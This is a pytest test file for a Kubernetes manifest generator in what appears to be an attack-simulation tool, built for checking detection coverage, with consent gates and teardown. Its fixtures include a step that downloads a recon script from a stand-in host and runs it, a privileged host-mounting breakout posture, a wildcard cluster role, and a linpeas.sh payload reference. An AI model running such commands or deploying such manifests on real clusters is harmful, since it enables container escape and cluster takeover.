"""generate_k8s — the emitted manifest.

These tests read the BUILT OBJECT GRAPH, never the scenario's declaration. A
check that reads what an author declared is a check on a comment; a check that
reads ``securityContext.privileged is True`` in the object about to be written
is a check on reality.
"""
from __future__ import annotations

import copy
import re
from datetime import datetime, timezone
from pathlib import Path

import pytest
import yaml

from engine import k8s_manifest as km
from engine.k8s_manifest import ClusterConsentRequired, findings_for, parse_posture
from engine.push_generator import BundleTargetUnsatisfiable, generate_k8s

NOW = datetime(2026, 8, 3, 12, 0, 0, tzinfo=timezone.utc)

BASE = {
    "scenario_id": "SIM-TEST-001",
    "name": "Test scenario",
    "plane": "CDR",
    "uc_ref": "UCS-CDR-01",
    "tc_ref": "TC-CDR-01",
    "mitre_technique": "T1611",
    "steps": [
        {"id": "step-01", "name": "enumerate", "identity": "www-data",
         "command": "curl -sSL https://example.invalid/deepce.sh -o /tmp/d.sh && bash /tmp/d.sh",
         "mitre_technique": "T1613", "platforms": ["container", "k8s"],
         "expected_detections": [
             {"plane": "CDR", "type": "BIOC", "description": "container recon"}]},
        {"id": "step-02", "name": "pivot", "identity": "root",
         "command": "kubectl get pods --all-namespaces",
         "mitre_technique": "T1611", "platforms": ["k8s"],
         "causality": {"parent_step": "step-01"}},
    ],
    "cleanup": {"commands": ["rm -f /tmp/d.sh"],
                "k8s_teardown": "kubectl delete -f {manifest_path}"},
}

WILDCARD = {
    "workload": "auto",
    "app_identity": {"name": "ci-runner", "component": "build"},
    "service_account": {
        "automount_token": True,
        "cluster_role_rules": [{"api_groups": ["*"], "resources": ["*"], "verbs": ["*"]}],
    },
}
BREAKOUT = {
    "workload": "deployment",
    "app_identity": {"name": "node-exporter"},
    "security_context": {"privileged": True, "capabilities_add": ["SYS_ADMIN"]},
    "host_access": {"host_pid": True, "host_paths": [
        {"name": "hostroot", "host_path": "/", "mount_path": "/host", "read_only": True}]},
}


def scenario(posture: dict | None = None, **over) -> dict:
    d = copy.deepcopy(BASE)
    if posture is not None:
        d["cluster_posture"] = posture
    d.update(over)
    return d


def docs(text: str) -> list[dict]:
    return [d for d in yaml.safe_load_all(text) if d]


def gen(sc: dict, **kw) -> list[dict]:
    kw.setdefault("now", NOW)
    return docs(generate_k8s(sc, **kw))


def by_kind(objs: list[dict], kind: str) -> list[dict]:
    return [o for o in objs if o["kind"] == kind]


def workload(objs: list[dict]) -> dict:
    for o in objs:
        if o["kind"] in ("Deployment", "Job", "DaemonSet") and not o["metadata"][
            "name"
        ].startswith("cortexsim-reaper-"):
            return o
    raise AssertionError("no workload object emitted")


# ---------------------------------------------------------------------------
# 1 · parses, and back-compat
# ---------------------------------------------------------------------------


def test_manifest_parses(repo_root: Path) -> None:
    for sc in (scenario(), scenario(WILDCARD), scenario(BREAKOUT)):
        objs = gen(sc, consent={"cluster_privilege_authorized": True,
                                "node_access_authorized": True})
        assert objs and objs[0]["kind"] == "Namespace"


def test_whole_corpus_emits_parseable_manifests(repo_root: Path) -> None:
    """Every POSIX-emittable scenario must still produce valid YAML."""
    n = 0
    for p in sorted((repo_root / "scenarios").rglob("*.yml")):
        if p.name.startswith("_"):
            continue
        try:
            data = yaml.safe_load(p.read_text())
        except Exception:  # noqa: BLE001
            continue
        if not isinstance(data, dict) or "scenario_id" not in data or "steps" not in data:
            continue
        try:
            objs = gen(data)
        except BundleTargetUnsatisfiable:
            continue  # same refusal format=bash gives — never a broken bundle
        assert objs[0]["kind"] == "Namespace", data["scenario_id"]
        assert not km.unmanaged_objects(objs), data["scenario_id"]
        n += 1
    assert n >= 160, f"only {n} scenarios exercised"


def test_scenario_without_posture_is_baseline_and_selfcontained() -> None:
    objs = gen(scenario())
    ns = objs[0]
    assert ns["metadata"]["annotations"][
        "cortexsim.io/delivery-contract"] == "self-contained"
    assert ns["metadata"]["annotations"]["cortexsim.io/risk-tier"] == "baseline"
    assert workload(objs)["kind"] == "Job"
    assert not by_kind(objs, "ClusterRole")
    # no consent key is required, so a plain generate_k8s(dict) call works
    assert km.required_consent_keys(parse_posture(scenario())) == ()


def test_unsatisfiable_scenario_refuses_like_format_bash() -> None:
    sc = scenario()
    sc["steps"][0]["command"] = "Get-Process | Stop-Process"
    sc["steps"][0]["platforms"] = ["windows"]
    sc["steps"][0].pop("platform_variants", None)
    with pytest.raises(BundleTargetUnsatisfiable):
        generate_k8s(sc)


# ---------------------------------------------------------------------------
# 2 · findings ARE the labels (anti-drift, hard requirement 3)
# ---------------------------------------------------------------------------


@pytest.mark.parametrize("posture", [None, WILDCARD, BREAKOUT,
                                     {**WILDCARD, **BREAKOUT}])
def test_emitted_labels_match_the_vocabulary_exactly(posture) -> None:
    sc = scenario(posture)
    objs = gen(sc, consent={"cluster_privilege_authorized": True,
                            "node_access_authorized": True})
    want = {f.slug for f in findings_for(parse_posture(sc) or km.ClusterPosture())}
    got = set(km.emitted_finding_slugs(objs))
    assert got == want, f"emitted {sorted(got - want)} extra / {sorted(want - got)} missing"


def test_every_object_carries_the_managed_by_label() -> None:
    """The label sweep guarantee: one command finds anything this engine ever
    left in any cluster — including the cluster-scoped objects namespace
    deletion does NOT reap."""
    objs = gen(scenario(WILDCARD), consent={"cluster_privilege_authorized": True})
    assert km.unmanaged_objects(objs) == ()
    assert by_kind(objs, "ClusterRole"), "no cluster-scoped object in this fixture"


def test_finding_carrier_lands_on_the_right_object() -> None:
    objs = gen(scenario(WILDCARD), consent={"cluster_privilege_authorized": True})
    cr = by_kind(objs, "ClusterRole")[0]
    ann = cr["metadata"]["annotations"]["cortexsim.io/posture-findings"].split(",")
    assert all(s.startswith("clusterrole-") for s in ann)
    sa = by_kind(objs, "ServiceAccount")[0]
    assert sa["metadata"]["labels"][
        "cortexsim.io/posture-finding"] == "serviceaccount-token-automounted"


# ---------------------------------------------------------------------------
# 3 · PSA, node targeting, resource bounds
# ---------------------------------------------------------------------------


def test_psa_labels_only_when_required() -> None:
    baseline_ns = gen(scenario(WILDCARD),
                      consent={"cluster_privilege_authorized": True})[0]
    assert not any(k.startswith("pod-security.kubernetes.io/")
                   for k in baseline_ns["metadata"]["labels"])

    node_ns = gen(scenario(BREAKOUT), consent={"node_access_authorized": True})[0]
    assert node_ns["metadata"]["labels"][
        "pod-security.kubernetes.io/enforce"] == "privileged"


def test_node_access_pins_away_from_the_control_plane() -> None:
    """Verified on a live 3-node k3s cluster: the control-plane node carries no
    taints, so omitting tolerations is NOT a mitigation. A privileged pod there
    owns etcd, the cluster CA and every secret in the cluster."""
    objs = gen(scenario(BREAKOUT), consent={"node_access_authorized": True})
    spec = workload(objs)["spec"]["template"]["spec"]
    exprs = spec["affinity"]["nodeAffinity"][
        "requiredDuringSchedulingIgnoredDuringExecution"][
        "nodeSelectorTerms"][0]["matchExpressions"]
    keys = {e["key"]: e["operator"] for e in exprs}
    assert keys["node-role.kubernetes.io/control-plane"] == "DoesNotExist"
    assert keys["node-role.kubernetes.io/master"] == "DoesNotExist"
    assert "tolerations" not in spec


def test_privileged_container_keeps_its_resource_limits() -> None:
    """Privilege is not a licence to be unbounded — an unlimited privileged pod
    is how you OOM a node that is also running the customer's workloads."""
    objs = gen(scenario(BREAKOUT), consent={"node_access_authorized": True})
    c = workload(objs)["spec"]["template"]["spec"]["containers"][0]
    assert c["securityContext"]["privileged"] is True
    assert c["resources"]["limits"]["memory"]


def test_bindings_only_reference_a_clusterrole_this_manifest_emitted() -> None:
    objs = gen(scenario(WILDCARD), consent={"cluster_privilege_authorized": True})
    emitted = {o["metadata"]["name"] for o in by_kind(objs, "ClusterRole")}
    for crb in by_kind(objs, "ClusterRoleBinding"):
        assert crb["roleRef"]["name"] in emitted, "bound to a role we do not own"
        for s in crb["subjects"]:
            assert s["kind"] == "ServiceAccount"
            assert not s["name"].startswith("system:")


# ---------------------------------------------------------------------------
# 4 · teardown (hard requirement 5)
# ---------------------------------------------------------------------------


def test_job_carries_an_api_enforced_deadline_and_no_evidence_reaper() -> None:
    """ttlSecondsAfterFinished:300 deleted the evidence of a failure five
    minutes after it happened, and deleted a posture finding before any KSPM
    scan cycle could discover it."""
    job = workload(gen(scenario()))
    assert job["kind"] == "Job"
    assert job["spec"]["activeDeadlineSeconds"] == 1800
    assert "ttlSecondsAfterFinished" not in job["spec"]


def test_deployment_always_gets_a_reaper() -> None:
    """A Deployment has no native TTL, so the reaper is the only thing that
    makes a forgotten workload die on its own."""
    objs = gen(scenario(BREAKOUT), consent={"node_access_authorized": True})
    reapers = [o for o in by_kind(objs, "Job")
               if o["metadata"]["name"].startswith("cortexsim-reaper-")]
    assert len(reapers) == 1
    assert reapers[0]["spec"]["activeDeadlineSeconds"] > 900


def test_reaper_rbac_is_resourcenames_pinned() -> None:
    """A resource-type-scoped rule here would itself be a cluster-wide RBAC
    deletion primitive in the customer's cluster."""
    objs = gen(scenario(WILDCARD), consent={"cluster_privilege_authorized": True})
    reaper_cr = [o for o in by_kind(objs, "ClusterRole")
                 if o["metadata"]["name"].startswith("cortexsim-reaper-")][0]
    emitted = {o["metadata"]["name"] for o in objs}
    assert reaper_cr["rules"], "reaper has no rules"
    for rule in reaper_cr["rules"]:
        assert rule.get("resourceNames"), f"unpinned rule {rule}"
        assert "*" not in rule["verbs"] and "*" not in rule["resources"]
        for n in rule["resourceNames"]:
            assert n in emitted or n == objs[0]["metadata"]["name"], (
                f"reaper may delete {n!r}, which this manifest did not emit"
            )


def test_cluster_scoped_objects_are_named_in_the_file() -> None:
    """`kubectl delete -f` is only a complete teardown because the ClusterRole
    and ClusterRoleBinding are IN the file. Namespace deletion never reaps them."""
    text = generate_k8s(scenario(WILDCARD), now=NOW,
                        consent={"cluster_privilege_authorized": True})
    objs = docs(text)
    assert by_kind(objs, "ClusterRole") and by_kind(objs, "ClusterRoleBinding")
    assert "kubectl delete -f cortexsim-SIM-TEST-001-k8s.yaml" in text
    assert "kubectl delete clusterrole,clusterrolebinding" in text
    assert "cortexsim.io/managed-by=push-generator" in text


def test_manifest_path_placeholder_is_substituted_everywhere() -> None:
    """`{manifest_path}` was substituted NOWHERE before this work, so nine CDR
    scenarios shipped a teardown recipe that was a documented lie."""
    text = generate_k8s(scenario(WILDCARD), now=NOW,
                        consent={"cluster_privilege_authorized": True})
    assert "{manifest_path}" not in text
    ns = docs(text)[0]
    assert ns["metadata"]["annotations"][
        "cortexsim.io/teardown"].startswith("kubectl delete -f cortexsim-SIM-TEST-001-k8s.yaml")


def test_expiry_annotation_is_generation_time_plus_ttl() -> None:
    ns = gen(scenario(WILDCARD), consent={"cluster_privilege_authorized": True})[0]
    assert ns["metadata"]["annotations"]["cortexsim.io/expires-at"] == "2026-08-03T12:30:00Z"
    assert ns["metadata"]["annotations"]["cortexsim.io/ttl-seconds"] == "1800"


# ---------------------------------------------------------------------------
# 5 · delivery contract + fail-loud (hard requirement 4)
# ---------------------------------------------------------------------------


def test_embedded_is_the_default_and_is_self_contained() -> None:
    text = generate_k8s(scenario(), now=NOW)
    assert "DELIVERY CONTRACT: self-contained" in text
    assert "CORTEXSIM_SERVER" not in text
    assert "/api/k8s/bootstrap" not in text
    payload = [o for o in docs(text)
               if o["kind"] == "ConfigMap" and o["metadata"]["name"].endswith("-payload")]
    assert len(payload) == 1
    assert payload[0]["data"]["bootstrap.sh"].startswith("#!/bin/bash")


def test_served_states_the_relaxed_contract_in_four_places() -> None:
    text = generate_k8s(scenario(), now=NOW, delivery="served",
                        simcore_url="http://simcore.lab:8888")
    objs = docs(text)
    # 1 · header
    assert "DELIVERY CONTRACT: cluster-to-simcore — NOT self-contained" in text
    assert "kubectl run cortexsim-preflight" in text
    # 2 · label on every object
    for o in objs:
        assert o["metadata"]["labels"]["cortexsim.io/delivery"] == "served"
    # 3 · annotation
    assert objs[0]["metadata"]["annotations"][
        "cortexsim.io/delivery-contract"] == "cluster-to-simcore"
    assert objs[0]["metadata"]["annotations"][
        "cortexsim.io/simcore-url"] == "http://simcore.lab:8888"
    # 4 · the fetch actually names the endpoint the payload builder must serve
    init = workload(objs)["spec"]["template"]["spec"]["initContainers"][0]
    assert "/api/k8s/bootstrap/$CORTEXSIM_SCENARIO" in init["args"][0]
    assert "/api/k8s/payloads" in init["args"][0]  # reachability probe


def test_served_declares_payloads_forces_served_delivery() -> None:
    sc = scenario({**WILDCARD, "payloads": ["linpeas.sh"]})
    text = generate_k8s(sc, now=NOW, simcore_url="http://s:8888",
                        consent={"cluster_privilege_authorized": True})
    assert "NOT self-contained" in text


def test_loopback_simcore_url_is_flagged_loudly() -> None:
    """A pod resolves localhost to ITSELF. This is the single most likely way
    the served mode fails in the field."""
    text = generate_k8s(scenario(), now=NOW, delivery="served",
                        simcore_url="http://localhost:8888")
    assert "LOOPBACK address" in text
    assert docs(text)[0]["metadata"]["annotations"][
        "cortexsim.io/simcore-url-suspect"] == "true"


def test_fetch_failure_exits_78_and_writes_the_termination_log() -> None:
    """Init:CrashLoopBackOff, not a degraded no-op. A pod that exits 0 having
    done nothing is indistinguishable in XSIAM from a pod that did everything
    and was missed."""
    objs = gen(scenario(), delivery="served", simcore_url="http://s:8888")
    init = workload(objs)["spec"]["template"]["spec"]["initContainers"][0]
    body = init["args"][0]
    assert f"exit {km.EXIT_NEVER_RAN}" in body
    assert "/dev/termination-log" in body
    assert "SIMCORE_UNREACHABLE" in body
    assert init["terminationMessagePolicy"] == "File"


def test_checksum_mismatch_refuses_to_execute() -> None:
    for delivery in ("embedded", "served"):
        objs = gen(scenario(), delivery=delivery, simcore_url="http://s:8888")
        body = workload(objs)["spec"]["template"]["spec"]["initContainers"][0]["args"][0]
        assert "sha256 MISMATCH" in body
        # An empty digest must be a hard failure, not a silently passing
        # `[ "" = "" ]` — that is how an integrity check becomes a no-op.
        assert 'BOOTSTRAP_SHA256:-' in body
        assert '[ -n "$ACT" ]' in body
        # .part -> mv AFTER verification makes an unverified bootstrap
        # structurally unreachable by the runner.
        assert "mv /cortexsim/.bootstrap.part /cortexsim/bootstrap.sh" in body
        assert "command -v sha256sum" in body  # no CHECKSUM_SKIPPED degrade path


def test_runner_refuses_without_a_verified_payload() -> None:
    objs = gen(scenario())
    c = workload(objs)["spec"]["template"]["spec"]["containers"][0]
    assert "[ -x /cortexsim/bootstrap.sh ]" in c["args"][0]
    assert f"exit {km.EXIT_NEVER_RAN}" in c["args"][0]


def test_integrity_env_is_flat_not_json_on_the_verify_path() -> None:
    """Shell JSON parsing with sed returns "" on a format drift and the
    comparison then passes."""
    objs = gen(scenario())
    cm = [o for o in by_kind(objs, "ConfigMap")
          if o["metadata"]["name"].endswith("-integrity")][0]
    assert "BOOTSTRAP_SHA256=" in cm["data"]["integrity.env"]
    body = workload(objs)["spec"]["template"]["spec"]["initContainers"][0]["args"][0]
    assert ". /cortexsim-integrity/integrity.env" in body
    assert "integrity.json" not in body  # JSON is for humans and the console only


def test_embedded_refuses_an_oversize_payload(monkeypatch) -> None:
    """Refuse; never truncate and never silently omit. A silently-omitted
    payload is the same false-negative shape as a silent no-op, one layer
    down."""
    monkeypatch.setattr(km, "CONFIGMAP_BUDGET_BYTES", 128)
    with pytest.raises(km.PayloadTooLargeToEmbed) as ei:
        generate_k8s(scenario(), now=NOW)
    body = ei.value.to_error()
    assert body["code"] == "PAYLOAD_TOO_LARGE_TO_EMBED"
    assert "delivery=served" in body["detail"]


# ---------------------------------------------------------------------------
# 6 · the payload itself
# ---------------------------------------------------------------------------


def test_bootstrap_is_deterministic_and_matches_the_baked_digest() -> None:
    sc = scenario()
    assert km.generate_bootstrap(sc) == km.generate_bootstrap(sc)
    # The property that actually matters: generation-time metadata belongs in
    # the MANIFEST, never in the payload whose digest the manifest bakes in.
    later = datetime(2027, 1, 1, tzinfo=timezone.utc)
    def payload_cm(objs):
        return [o for o in by_kind(objs, "ConfigMap")
                if o["metadata"]["name"].endswith("-payload")][0]["data"]["bootstrap.sh"]
    assert payload_cm(gen(sc)) == payload_cm(gen(sc, now=later))
    assert not re.search(r"\d{4}-\d{2}-\d{2}T\d{2}:\d{2}:\d{2}Z", km.generate_bootstrap(sc))
    ns = gen(sc)[0]
    assert ns["metadata"]["annotations"][
        "cortexsim.io/bootstrap-sha256"] == km.bootstrap_digest(sc)


def test_missing_binary_is_exit_78_not_a_silent_skip() -> None:
    """ubuntu:22.04 (the previous image) ships no curl, no wget and no python3,
    so 14 CDR scenarios could not execute a step in ANY manifest this engine
    ever emitted — and it read as 'the attack ran and Cortex missed it'."""
    body = km.generate_bootstrap(scenario())
    assert "require_bin curl step-01" in body
    assert "require_bin kubectl step-02" in body
    assert "MISSING_BIN" in body
    assert f"exit {km.EXIT_NEVER_RAN}" in body


def test_every_step_is_a_subshell_child_of_one_anchor_shell() -> None:
    """The identical shape the Go beacon uses, so pull-mode and k8s-push produce
    the same causality tree — one CGO-rooted spine, not N unrelated per-step
    process trees rooted at N container shims."""
    body = km.generate_bootstrap(scenario())
    assert body.count("( run_as ") == 2
    assert "run_as()" in body  # the shared identity harness, not a third fork
    assert "status=start" in body and "status=ok" in body and "status=fail" in body


def test_anchor_process_is_service_shaped() -> None:
    objs = gen(scenario(WILDCARD), consent={"cluster_privilege_authorized": True})
    c = workload(objs)["spec"]["template"]["spec"]["containers"][0]
    assert c["name"] == "ci-runner"
    assert {"name": "CORTEXSIM_ANCHOR", "value": "ci-runner"} in c["env"]
    assert 'cp "$SH" "$ANCHOR"' in c["args"][0]
    assert 'exec "$ANCHOR" /cortexsim/bootstrap.sh' in c["args"][0]


def test_anchor_falls_back_to_cgo_anchor_when_no_app_identity() -> None:
    sc = scenario()
    sc["cgo_anchor"] = {"image_name": "payments-api", "primary_username": "root"}
    assert workload(gen(sc))["metadata"]["name"] == "payments-api"


def test_libc_mismatch_is_a_hard_stop() -> None:
    c = workload(gen(scenario()))["spec"]["template"]["spec"]["containers"][0]
    assert "CORTEXSIM_LIBC" in c["args"][0]
    assert "ldd --version" in c["args"][0]


def test_musl_warns_that_the_anchor_cannot_be_renamed() -> None:
    text = generate_k8s(scenario({"libc": "musl", "app_identity": {"name": "front-end"}}),
                        now=NOW)
    assert "busybox" in text
    assert docs(text)[0]["metadata"]["annotations"]["cortexsim.io/musl-caveat"]


def test_readonly_rootfs_gets_a_writable_anchor_dir() -> None:
    """readOnlyRootFilesystem breaks the anchor rename; a silent downgrade would
    give a wrong CGO name with no warning."""
    objs = gen(scenario({"security_context": {"read_only_root_filesystem": True}}))
    mounts = workload(objs)["spec"]["template"]["spec"]["containers"][0]["volumeMounts"]
    assert any(m["mountPath"] == "/usr/local/bin" for m in mounts)


def test_deployment_holds_open_and_job_does_not() -> None:
    """A posture finding reaped before the customer's KSPM scan cycle cannot be
    discovered — the finding must persist like the workload it lives on."""
    dep = workload(gen(scenario(WILDCARD),
                       consent={"cluster_privilege_authorized": True}))
    job = workload(gen(scenario()))
    denv = {e["name"]: e["value"] for e in
            dep["spec"]["template"]["spec"]["containers"][0]["env"]}
    jenv = {e["name"]: e["value"] for e in
            job["spec"]["template"]["spec"]["containers"][0]["env"]}
    assert denv["CORTEXSIM_HOLD"] == "1"
    assert jenv["CORTEXSIM_HOLD"] == "0"


# ---------------------------------------------------------------------------
# 7 · consent at the generation seam
# ---------------------------------------------------------------------------


def test_generation_refuses_without_consent_when_consent_is_supplied() -> None:
    with pytest.raises(ClusterConsentRequired):
        generate_k8s(scenario(WILDCARD), now=NOW, consent={})
    generate_k8s(scenario(WILDCARD), now=NOW,
                 consent={"cluster_privilege_authorized": True})


def test_kill_switch_blocks_node_access_at_generation() -> None:
    with pytest.raises(ClusterConsentRequired) as ei:
        generate_k8s(scenario(BREAKOUT), now=NOW,
                     consent={"node_access_authorized": True},
                     allow_privileged_k8s=False)
    assert ei.value.to_error()["code"] == "CLUSTER_PRIVILEGE_DISABLED"


def test_unknown_delivery_names_the_future_value() -> None:
    with pytest.raises(ValueError, match="known future value"):
        generate_k8s(scenario(), delivery="image")
